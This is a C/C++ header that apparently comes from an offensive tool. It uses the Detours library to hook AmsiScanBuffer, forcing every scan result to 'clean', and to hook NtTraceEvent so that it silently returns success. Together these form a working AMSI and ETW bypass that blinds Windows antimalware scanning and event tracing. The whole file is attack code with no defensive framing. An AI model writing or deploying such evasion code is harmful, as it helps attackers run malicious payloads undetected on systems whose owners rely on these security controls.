#pragma once
#include <Windows.h>
#include <amsi.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include "detours.h"


typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* NtTraceEvent_t)(
	HANDLE TraceHandle,
	ULONG Flags,
	ULONG FieldSize,
	PVOID Fields
);

typedef HRESULT(WINAPI* AmsiScanBuffer_t)(
	HAMSICONTEXT amsiContext, 
	PVOID buffer, 
	ULONG length, 
	LPCWSTR contentName, 
	HAMSISESSION amsiSession, 
	AMSI_RESULT* result
);




AmsiScanBuffer_t pOriginalAmsiScanBuffer = AmsiScanBuffer;
NtTraceEvent_t pOriginalNtTraceEvent = NULL;

HRESULT HookedAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)
{
	printf("[*] amsi.dll!AmsiScanBuffer Intercepted\n");

	//set result to AMSI_RESULT_CLEAN
	*result = AMSI_RESULT_CLEAN;

	//NOTE: The return value of AmsiScanBuffer is ignored. The real return value is the pointed to by AMSI_RESULT* in arguments
	return 0x0;
}

NTSTATUS HookedNtTraceEvent(HANDLE TraceHandle, ULONG Flags, ULONG FieldSize, PVOID Fields)
{
	printf("[*] ntdll.dll!NtTraceEvent Intercepted\n");

	//return STATUS_SUCCESS
	return 0x0; //STATUS_SUCCESS

}

BOOL HookAmsiScanBuffer()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pOriginalAmsiScanBuffer, HookedAmsiScanBuffer);
	DetourTransactionCommit();
	return TRUE;
}

BOOL HookNtTraceEvent()
{

	pOriginalNtTraceEvent = (NtTraceEvent_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pOriginalNtTraceEvent, HookedNtTraceEvent);
	DetourTransactionCommit();
	return TRUE;
}
